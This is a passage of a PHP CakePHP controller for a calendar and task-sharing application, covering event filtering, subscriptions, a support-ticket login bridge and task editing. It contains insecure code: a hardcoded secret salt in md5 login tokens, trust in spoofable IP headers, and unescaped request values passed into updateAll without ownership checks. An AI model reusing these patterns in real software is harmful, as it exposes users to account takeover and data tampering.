		$aEvents = $this->UserEvent->find('all', compact('conditions', 'order'));
		// /СВОИ СОБЫТИЯ

		$conditions = array(
			'UserEventShare.acceptance <> ?' => '-1',
			'UserEventShare.user_id' => $this->currUserID
		);
		$aEventShare = $this->UserEventShare->find('all', compact('conditions'));
		$aEventID = Hash::extract($aEventShare, '{n}.UserEventShare.user_event_id');
		$aEventShare = Hash::combine($aEventShare, '{n}.UserEventShare.user_event_id', '{n}.UserEventShare');

		// НЕ СВОИ СОБЫТИЯ

		$conditions = array(
			'UserEvent.is_delayed' => '0',
			'UserEvent.user_id <>' => $this->currUserID,
			'UserEvent.id' => $aEventID,
			'UserEvent.shared' => '1'
		);

		if( $this->request->data('type') ) {
			switch ($this->request->data('type')) {
				case 'none':
					$conditions['UserEvent.category'] = '0';
					break;
				case 'all':
					break;
				default:
					$conditions['UserEvent.type'] = $this->request->data('type');
					break;
			}
		}

		if( $this->request->data('category') ) {
			switch ($this->request->data('category')) {
				case '1':
					$conditions['UserEvent.category'] = '0';
					break;
				case '2':
					$conditions['UserEvent.category'] = '1';
					break;
			}
		}

		if( $this->request->data('time') != null ) {
			switch ($this->request->data('time')) {
				case '0':
					$ddf = strtotime($this->request->data('dateFrom'));
					$ddt = strtotime($this->request->data('dateTo'));
					if($ddf && $ddt) {
						$dateFrom = $ddf < $ddt ? date('Y-m-d ', $ddf).'00:00:00' : date('Y-m-d ', $ddt).'00:00:00' ;
						$dateTo = $ddf > $ddt ? date('Y-m-d ', $ddf).'23:59:59' : date('Y-m-d ', $ddt).'23:59:59' ;

						$conditions[] = array('UserEvent.event_time >= ?' => $dateFrom );
						$conditions[] = array('UserEvent.event_time <= ?' => $dateTo );
					}
					break;
				case '-1':
					$conditions[] = array('UserEvent.event_time < ?' => date('Y-m-d H:i:s') );
					break;
				case '1':
					$conditions[] = array('UserEvent.event_time >= ?' => date('Y-m-d ').'00:00:00' );
					$conditions[] = array('UserEvent.event_time <= ?' => date('Y-m-d ').'23:59:59' );
					break;
				case '2':
					$conditions[] = array('UserEvent.event_time >= ?' => date('Y-m-d H:i:s') );
					break;
			}
		}
		$order = 'UserEvent.title';
		$aEvents = array_merge($aEvents, $this->UserEvent->find('all', compact('conditions', 'order')));

		// /НЕ СВОИ СОБЫТИЯ

		$data = array();
		$editData = array();
		$detailsData = array();
		foreach($aEvents as $event) {
			if( $event['UserEvent']['event_time'] != '0000-00-00 00:00:00' && $event['UserEvent']['event_end_time'] != '0000-00-00 00:00:00' && $event['UserEvent']['event_end_time'] != $event['UserEvent']['event_time'] ) {
				$event['UserEvent']['duration'] = strtotime($event['UserEvent']['event_end_time']) - strtotime($event['UserEvent']['event_time']);
			} else {
				$event['UserEvent']['duration'] = 0;
			}
			if( !in_array($event['UserEvent']['type'], array('meet', 'call', 'mail', 'conference', 'sport', 'task', 'purchase', 'entertain', 'pay')) ) {
				$event['UserEvent']['type'] = 'none';
			}
			$category = ($event['UserEvent']['category']) ? 'personal' : 'work';
			$owner = $event['UserEvent']['user_id'] == $this->currUserID ? 'owner' : 'non_owner';

			$groupTitle = __('COMMON');
			switch ($event['UserEvent']['object_type']) {
				case 'task':
					$group = $this->Task->getTaskGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'subproject':
					$group = $this->Subproject->getSubprojectGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'project':
					$group = $this->Project->getProjectGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'group':
					$group = $this->Group->findById( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
			}

			// не записываются только для общей сводки, верхней таблицы
			if($owner == 'owner') {
				$data[$owner][$groupTitle][$event['UserEvent']['title']][$category][$event['UserEvent']['type']]['events'][] = $event['UserEvent'];
			}
			$detailsData[$groupTitle][] = $event;
		}

		foreach( $data as &$groupData ) {

			// Перенос общей группы в конец
			if( isset($groupData[__('COMMON')]) ) {
				$common = $groupData[__('COMMON')];
				unset($groupData[__('COMMON')]);
				$groupData[__('COMMON')] = $common;
			}
			foreach ( $groupData as &$ownerData ) {
				foreach( $ownerData as $title => &$eventCategory ) {
					foreach( $eventCategory as &$category ) {
						foreach($category as &$type) {
							// добавление полей с количесвом и временем
							$type['count'] = count($type['events']);
							$type['time'] = 0;
							foreach($type['events'] as &$event) {
								$type['time'] += $event['duration'];
							}
							unset($type['events']);
						}
					}
				}
			}
		}

		$this->set('data', $data);
		$this->set('detailsData', $detailsData);

		$conditions = array(
			'UserEvent.user_id' => $this->currUserID,
			'UserEvent.is_delayed' => '1'
		);

		$delayedCound = $this->UserEvent->find('count', compact('conditions'));
		$this->set('delayedCound', $delayedCound);

		$aTypeOptions = array(
			'all' => __('All events'),
			'meet' => __('Meeting'),
			'call' => __('Phone call'),
			'mail' => __('Send email'),
			'conference' => __('Conference'),
			'sport' => __('Sport'),
			'task' => __('Task'),
			'purchase' => __('Purchase'),
			'entertain' => __('Entertainment'),
			'pay' => __('Payment'),
			'none' => __('Other')
		);
		$this->set('aTypeOptions', $aTypeOptions);

		$aPassOptions = array(
			'0' => __('Period'),
			'-1' => __('Past'),
			'1' => __('Present'),
			'2' => __('Future')
		);
		$this->set('aPassOptions', $aPassOptions);

		$aCategoryOptions = array(
			'0' => __('All categories'),
			'1' => __('Work'),
			'2' => __('Personal')
		);
		$this->set('aCategoryOptions', $aCategoryOptions);

		$aCategoryChangeOptions = array(
			'work' => __('Work'),
			'personal' => __('Personal')
		);
		$this->set('aCategoryChangeOptions', $aCategoryChangeOptions);
	}

	public function delayedEvents() {
		$this->loadModel('UserEvent');
		$this->loadModel('Group');
		$this->loadModel('Project');
		$this->loadModel('Subproject');
		$this->loadModel('Task');
		$aPersonal = array('sport', 'purchase', 'entertain');
		$aWork = array('call', 'meet', 'task', 'mail', 'conference', 'pay');

		$conditions = array(
			'UserEvent.user_id' => $this->currUserID,
			'UserEvent.is_delayed' => '1'
		);

		$order = 'UserEvent.title';

		$aEvents = $this->UserEvent->find('all', compact('conditions', 'order'));
		$this->set('aEvents', $aEvents);

		$aGroups = $this->Group->userGroups($this->currUserID);
		$aProjects = $this->Project->userProjects($this->currUserID);
		$aSubprojects = $this->Subproject->userSubprojects($this->currUserID);
		$aTasks = $this->Task->getMyTasks();

		$aBindOptions = array();
		foreach($aGroups as $id => $value ) {
			$data = array('category' => __('Groups'), 'type' => 'group', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aProjects as $id => $value ) {
			$data = array('category' => __('Projects'), 'type' => 'project', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aSubprojects as $id => $value ) {
			$data = array('category' => __('Subprojects'), 'type' => 'subproject', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aTasks as $id => $value ) {
			$data = array('category' => __('Tasks'), 'type' => 'task', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		$this->set('aBindOptions', json_encode($aBindOptions));
		$this->set('eventAutocomplete', $this->UserEvent->userEventOptionsJson());

		$title = __('Delayed events');
		$this->set(compact('title'));
	}

	public function addSubscription($object_id) {
		$this->loadModel('Subscription');

		$subscriber_id = $this->currUserID;
		$type = 'user';

		$data = compact('type', 'object_id', 'subscriber_id');

		$this->Subscription->save($data);
		$this->redirect($this->referer());
	}

  public function deleteSubscription($id) {
    $this->loadModel('Subscription');

    $this->Subscription->delete($id);
    $this->redirect($this->referer());
  }

  public function tickets() {
    $this->autoRender = false;

    $this->loadModel('TicketUser');
    $this->TicketUser->setDatasource('tickets');
    $this->TicketUser->useTable = 'users';
    $token = md5('HutQkAi5wnjUqGsYQuDCkL0S9oCIzADogVhaGRrBIpkPYfVx54J0RWWsRDep1x3Lr2s6iEJsC79sIQYw'.$this->currUserID);

    $user = $this->TicketUser->findByKonstrUserId($this->currUserID);
    if(!$user) {
      $user = $this->User->findById($this->currUserID);

      $ip = getenv('HTTP_CLIENT_IP')?:
      getenv('HTTP_X_FORWARDED_FOR')?:
      getenv('HTTP_X_FORWARDED')?:
      getenv('HTTP_FORWARDED_FOR')?:
      getenv('HTTP_FORWARDED')?:
      getenv('REMOTE_ADDR');

      if (in_array( $user['User']['id'] ,array( 71, 76, 142, 161 ))) {
        $accessLevel = 4;
      }
      else
      {
        $accessLevel = 0;
      }

      $tUser = array(
        'email' => Hash::get($user, 'User.username'),
        'password' => '###',
        'token' => $token,
        'name' => Hash::get($user, 'User.full_name'),
        'access_level' => $accessLevel,
        'IP' => $ip,
        'bio_pic' => Hash::get($user, 'UserMedia.url_download'),
        'locked_category' => 0,
        'konstr_user_id' => Hash::get($user, 'User.id')
      );

      $user = $this->TicketUser->save($tUser);
    }

    return $this->redirect( Configure::read('supportURL').'/logink/login/'.$token );
  }

  public function mailer($id = null) {
    $this->layout = 'ajax';

    if(!$id) {
      $id = $this->currUserID;
    }

    $user = $this->User->findById($this->currUserID);
    $testUser = $this->User->findById($id);

    $currTime = time();
    $lastTime = strtotime(Hash::get($testUser, 'User.last_update'));

    $date1 = $lastTime > ($currTime - 43200) ? date("Y-m-d H:i:s", $lastTime) : date("Y-m-d H:00:00", $currTime - 43200);
    $date2 = date("Y-m-d H:00:00", $currTime);
    $data = $this->User->getTimeline($id, $date1, $date2);

    $this->set('data', $data);
    $this->set('timeFrom', strtotime($date1));
    $this->set('timeTo', strtotime($date2));
  }

    public function admin_login() {
        $this->layout = 'login';
		if ($this->Attempt->limit()) {
			if ($this->request->is('post')) {
	            if ($this->Auth->login()) {
					$this->Attempt->reset();
	                return $this->redirect($this->Auth->redirect());
	            } else {
					$this->Attempt->fail();
	                $this->Session->setFlash(AUTH_ERROR, null, null, 'auth');
	            }
	        }
		} else {
			$this->Session->setFlash(__('Too much login attempts. You are blocked for 15 minutes'), null, null, 'auth');
		}

    }

    public function admin_logout() {
        $this->layout = 'login';
        $this->redirect($this->Auth->logout());
    }

	public function task($id = 0) {

		$this->loadModel('UserEvent');
		$this->loadModel('User');
		$this->loadModel('UserEventRequest');
		$this->loadModel('UserEventShare');
		$this->loadModel('Subscription');

		if(empty($id)||!$this->UserEvent->exists($id)){
			throw new NotFoundException(__('Requested task does not exist'));
		}

		$conditions = array(
			'Media.object_type' => 'Cloud',
			'Media.object_id' => $id
		);
		$mediaFiles = $this->Media->find('all', compact('conditions'));

		$task = $this->UserEvent->findById($id);

		$this->loadModel('UserEventEvent');

		$conditions = array(
				'UserEventShare.acceptance <> ?' => '-1',
				'UserEventShare.user_event_id' => $id
		);

		$aEventShare = Hash::combine($this->UserEventShare->find('all', compact('conditions')),'{n}.UserEventShare.user_id','{n}');

		$event = Hash::get($task,'UserEvent');
		$conditions = array(
			'UserEvent.id !=' => $id,
			'UserEvent.type' => 'task',
			'UserEvent.external' => '1',
			'UserEvent.event_category_id' => Hash::get($task,'UserEvent.event_category_id')
		);

		$order = 'UserEvent.hits';
		$limit = '10';
		$newCatTasks = $this->UserEvent->find('all', compact('conditions','order', 'limit'));

		$conditions = array(
			'UserEvent.id !=' => $id,
			'UserEvent.type' => 'task',
			'UserEvent.external' => '1',
			'UserEvent.event_category_id !=' => Hash::get($task,'UserEvent.event_category_id')
		);
		$otherTasks = $this->UserEvent->find('all', compact('conditions','order', 'limit'));

		$this->set(compact('task','newCatTasks', 'otherTasks','aEventShare', 'mediaFiles'));

		if(($event['user_id'] == $this->currUserID)|| !empty($event['recipient_id']) || (!empty($event['object_type']) && $event['object_type'] == 'group') || $event['external']){

			$conditions = array(
				'UserEventRequest.event_id' => $id,
			);

			$eventRequest = $this->UserEventRequest->find('all', compact('conditions'));
			$eventRequest = Hash::combine($eventRequest,'{n}.UserEventRequest.user_id','{n}');

			if($this->Session->check('UserEvent.hits.'.$id) === false){
				$hits = $task['UserEvent']['hits']+1;
				$this->UserEvent->updateAll(
					array('UserEvent.hits' => $hits),
					array('UserEvent.id' => $id)
				);
				$task['UserEvent']['hits'] = $hits;
				$this->Session->write('UserEvent.hits.'.$id, true);
			}
			$this->Session->write('UserEvent.hits.'.$id, false);
			$lastTaskID = $this->Session->read('UserEvent.hits');

			$conditions = array(
				'UserEvent.id' => array_keys($lastTaskID),
				'UserEvent.id !=' => $id,
				'UserEvent.external' => '1',
				'UserEvent.type' => 'task'
			);

			$viewedTasks = Hash::combine($this->UserEvent->find('all', compact('conditions','order', 'limit')), '{n}.UserEvent.id', '{n}');

			$this->User->Behaviors->load('Containable');
			$users = $this->User->find('all', array(
				'contain' => array('UserMedia', 'UniversityMedia'),
				'conditions' => array(
					'User.id' => array_merge(
						array($this->currUserID, $task['User']['id']),
						Hash::extract($aEventShare,'{n}.UserEventShare.user_id'),
						Hash::extract($eventRequest,'{n}.UserEventRequest.user_id'),
						Hash::extract($newCatTasks, '{n}.User.id'),
						Hash::extract($otherTasks, '{n}.User.id')
					),
				)
			));

			$users = Hash::combine($users,'{n}.User.id','{n}');
			$subscription = $this->Subscription->findByTypeAndObjectIdAndSubscriberId('user', Hash::get($task,'User.id'), $this->currUserID);

			$this->set(compact('users','eventRequest','subscription','lastTaskID','viewedTasks'));
		} else {
			throw new NotFoundException(__('Requested task does not exist'));
		}
	}

		public function taskManagement() {
			$this->loadModel('UserEvent');

			$this->loadModel('Group');
			$this->loadModel('Project');
			$this->loadModel('Subproject');
			$this->loadModel('User');
			$this->loadModel('Group');
			$this->loadModel('GroupMember');
			$this->loadModel('UserEventShare');
			$conditions = array(
				'UserEvent.user_id' => $this->currUserID,
				'UserEvent.is_delayed' => '0',
				'UserEvent.type' => 'task'
			);

			$myTasks = $this->UserEvent->find('all', compact('conditions'));
			$this->set('myTasks', $myTasks);

			$conditions = array(
				'User.id' => $this->currUserID,
			);

			$author = $this->User->find('first',compact('conditions'));
			$this->set('author', $author);

			$conditions = array(
					'UserEventShare.acceptance <> ?' => '-1',
					'UserEventShare.user_id' => $this->currUserID
			);

			$aEventShare = $this->UserEventShare->find('all', compact('conditions'));
			$aEventID = Hash::extract($aEventShare, '{n}.UserEventShare.user_event_id');

			$aEventShare = Hash::combine($aEventShare, '{n}.UserEventShare.user_event_id', '{n}.UserEventShare');

			//$dateRange =  $this->dateRange('UserEvent.event_time', $date, $date2);
			$conditions = array();
			$this->loadModel('Group');
			$this->loadModel('GroupMember');
			$conditions = array('GroupMember.user_id' => $this->currUserID, 'GroupMember.is_deleted' => 0, 'GroupMember.approved' => 1);
			$userGroups = $this->GroupMember->find('all', compact('conditions'));
			$userGroups = Hash::extract($userGroups,'{n}.GroupMember.group_id');
			//($dateRange);
			$conditions = array(
					'UserEvent.is_delayed' => '0',
					'UserEvent.type' => 'task',
					//'UserEvent.external' => '1',
					'UserEvent.user_id !=' => $this->currUserID,
				//	'UserEvent.external_time <' => date('Y-m-d H:i:s'),
					'OR' => array(
							array(
								'AND' => array(
										'UserEvent.id' => $aEventID,
										'UserEvent.shared' => '1',
								)
							),
							'AND' => array(
									'UserEvent.object_id' => $userGroups,
									'UserEvent.external' => 1,
							)
					)
			);


			$order = array('UserEvent.event_time', 'UserEvent.created');
			$aEvents = $this->UserEvent->find('all', compact('conditions', 'order'));
			$this->set('sharedTasks', $aEvents);

			$this->loadModel('UserEventRequest');
			$conditions = array(
					'UserEventRequest.user_id ' => $this->currUserID,
					'UserEventRequest.status <> ?' => '-1',
			);
			$aEventsRequests = $this->UserEventRequest->find('all',compact('conditions'));
			$aEventsInviteIDS = Hash::extract($aEventsRequests, '{n}.UserEventRequest.event_id');

			$conditions = array(
					'UserEvent.is_delayed' => '0',
					'UserEvent.type' => 'task',
					'UserEvent.external' => '1',
					'UserEvent.id ' => $aEventsInviteIDS,

			);
			$aEventsInvite = $this->UserEvent->find('all', compact('conditions', 'order'));
			$this->set('aEventsInvite', $aEventsInvite);
			//Заголовок страницы
			$title = __('Task management');
			$this->set(compact('title'));
		}

		public function addComment() {
			$this->loadModel('UserEventEvent');

			$echo = $this->UserEventEvent->addComment($this->request->data);
			$event_id = $this->request->data('UserEventEvent');
			$event_id = $event_id['event_id'];
			//$this->redirect($this->referer());

		}
		public function addEventRequest(){

			if($this->request->data('UserEventRequest.user_id') == $this->currUserID){
				throw new MethodNotAllowedException("You can not make proposals to your own tasks");
			}
			$this->loadModel('UserEventRequest');

			$duration = $this->request->data('UserEventRequest.duration');
			if(!isset($duration)){
				$duration = $this->request->data('UserEvent.duration');
			}
			$curr = date('Y-m-d');
			$starttime = strtotime($curr);
			$endtime = strtotime($duration);
			$period = ($endtime - $starttime);
			$hours = $period/(60*60);
			$this->request->data['UserEventRequest']['user_id'] = $this->currUserID;
			$this->request->data['UserEventRequest']['duration'] = (int)round($hours);
			$this->request->data['UserEventRequest']['price'] = $this->request->data['UserEvent']['price'];
			$this->request->data['UserEventRequest']['event_id'] = $this->request->data['UserEvent']['event_id'];

			$this->UserEventRequest->save($this->request->data);

			$this->redirect($this->referer());

		}

		public function editTaskEvent(){
				$this->loadModel('UserEvent');
				$data = array(
					'UserEvent.user_id' => $this->request->data('UserEvent.user_id'),
				);

				if(!empty($this->request->data('UserEvent.event_end_time'))){
					$thisYear = date('Y-m-d H:i:s', strtotime($this->request->data('UserEvent.event_end_time')));
					$data['UserEvent.event_end_time'] = '"'.$thisYear.'"';
				}
				if(!empty($this->request->data('UserEvent.price'))){
					$data['UserEvent.price'] = $this->request->data('UserEvent.price');
				}
				if(!empty($this->request->data('UserEvent.descr'))){
					$data['UserEvent.descr'] = '"'.addslashes($this->request->data('UserEvent.descr')).'"';//
				}
				if(!empty($this->request->data('UserEvent.category'))){
					$data['UserEvent.event_category_id'] = $this->request->data('UserEvent.category');
				}

				$event_id = $this->request->data('UserEvent.event_id');

				$conditions = array(
					'UserEvent.id' => $event_id,
				);

				$this->UserEvent->updateAll($data,$conditions);
				$this->redirect($this->referer());
				exit();
		}

}
